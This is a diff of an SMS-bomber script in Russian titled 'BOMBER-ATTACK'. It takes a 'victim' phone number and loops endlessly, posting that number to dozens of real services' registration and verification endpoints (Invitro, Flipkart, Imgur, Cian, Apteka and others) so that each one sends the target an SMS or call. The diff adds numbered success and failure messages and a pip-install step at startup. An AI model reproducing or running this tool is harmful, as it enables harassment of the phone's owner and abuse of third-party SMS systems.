@@ -1,8 +1,21 @@
 import os, sys, time, requests, random
+print('Установка программы... Пожалуйста подождите..')
+time.sleep(5)
+os.system('python -m pip install pip')
+os.system('pip install requests')
+print("""
+    """)
 
+print("""
+    """)
+
+print("""
+    """)
+
+print("""
+    """)
 #АВТОР - uw935
 #Если увидели ЛЯП - пишите @uw935
-
 board = ("""
 ┌─────────────────────────────────────────────┐
 │                BOMBER-ATTACK                │
@@ -41,7 +54,6 @@ except:
 _phone = phone
 np = "\033[37m\033[47m_\033[0m"
 np2 = "\033[47m_____\033[30m                         \033[0m\033[44m\033[34m_ \033[0m"
-
 start = """
 Что бы начать СПАМ-АТАКУ нажмите 'enter'."""
 print(start)
@@ -50,19 +62,19 @@ input() #задержка
 print("""Что бы остановить БОМБЕР - закройте приложение. """)
 print("Номер жертвы: " + phone)
 
-print("""
-    Подготовка...""")
-time.sleep(5)
-print("""
-    Подготовка...""")
-time.sleep(5)
-print("""
-    Готово!
-    """)
-time.sleep(2)
-print("""Немного подождите..
-    """)
-time.sleep(10)
+#print("""
+#    Подготовка...""")
+#time.sleep(5)
+#print("""
+#    Подготовка...""")
+#time.sleep(5)
+#print("""
+#    Готово!
+#    """)
+#time.sleep(2)
+#print("""Немного подождите..
+#    """)
+#time.sleep(10)
 
 #CODE
 for x in range(12):
@@ -658,183 +670,226 @@ while True:
         print('[-] Не отправилось.')
     try:
         requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
+        print("[+] 110 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
+        print("[+] 111 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
+        print("[+] 112 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
+        print("[+] 113 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
+        print("[+] 114 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
+        print("[+] 115 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
+        print("[+] 116 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
+        print("[+] 117 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
+        print("[+] 118 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
+        print("[+] 119 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
+        print("[+] 120 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
+        print("[+] 121 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonemas,"g-recaptcha-response": ""})
+        print("[+] 122 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
+        print("[+] 123 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
+        print("[+] 124 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
+        print("[+] 125 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
+        print("[+] 126 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
+        print("[+] 127 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
+        print("[+] 128 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonemas,"g-recaptcha-response": None})
+        print("[+] 129 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
+        print("[+] 130 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
+        print("[+] 131 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+## (###) ###-##-##")
         requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonemas,"password": password,"password2": password})
+        print("[+] 132 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
+        print("[+] 133 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
+        print("[+] 134 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
+        print("[+] 135 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
+        print("[+] 136 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonemas,"type": "register"})
+        print("[+] 137 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
+        print("[+] 138 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
+        print("[+] 139 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
+        print("[+] 140 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonemas})
+        print("[+] 141 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
+        print("[+] 142 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
+        print("[+] 143 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
+        print("[+] 144 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone9, maska="(###)###-##-##")
         requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonemas, "sendphone": "Далее"})
+        print("[+] 145 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
+        print("[+] 146 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonemas})
+        print("[+] 147 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
+        print("[+] 148 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone9, maska="(###) ###-##-##")
         requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonemas})
+        print("[+] 149 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://oauth.av.ru/check-phone",json={"phone": phonemas})
+        print("[+] 150 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
+        print("[+] 151 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
     try:
         phonemas=mask(str=phone, maska="+# (###) ###-##-##")
         requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonemas,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
+        print("[+] 152 - отправлено!")
     except:
-        pass
+        print('[-] Не отправилось.')
